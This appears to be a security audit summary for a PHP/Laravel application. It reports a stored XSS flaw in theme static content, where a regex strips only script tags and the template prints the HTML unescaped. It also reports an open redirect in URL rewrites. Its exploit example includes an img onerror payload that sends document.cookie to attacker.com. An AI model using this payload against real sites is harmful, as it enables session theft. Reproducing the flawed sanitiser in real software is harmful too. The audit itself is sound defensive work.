## Final Analysis Summary

### Primary Finding: Stored Cross-Site Scripting (XSS) via Static Content Theme Customization

**Vulnerability Path:**

1. **Store** — `ThemeCustomizationRepository::update()` (line 32–34) uses only a regex `preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', ...)` to sanitize HTML for `static_content` type themes. This removes `<script>` tags but leaves event handlers (`onerror`, `onload`, `onmouseover`, `onfocus`, `onclick`, etc.), `javascript:` URIs in `href`, `<iframe>`, `<embed>`, `<object>`, `<svg/onload>`, `<details/ontoggle>`, and all other HTML-based XSS vectors intact.

2. **Output** — `home/index.blade.php` (line 60–62) renders the stored HTML with **un-escaped** `{!! $data['html'] !!}`, meaning any embedded JavaScript executes in the visitor's browser.

3. **Impact** — Any user visiting the homepage executes the injected script. This can be used to steal session cookies, exfiltrate CSRF tokens, perform actions on behalf of authenticated users, redirect to phishing sites, or deface the application.

4. **Contrast with CMS/Category** — CMS pages and category descriptions correctly use `clean_content()` which runs full HTMLPurifier sanitization. The theme `static_content` type bypasses this entirely, relying on a weak regex.

**Exploit example:**
```html
<img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>
```
or
```html
<svg onload=alert(document.domain)>
```

### Secondary: Open Redirect via URL Rewrite Entities

URL rewrites (CMS pages, categories, products) use `redirect()->to($urlRewrite->target_path)` without validating the target is internal. An admin with `settings.themes.edit` equivalent access can set `target_path` to any external URL.
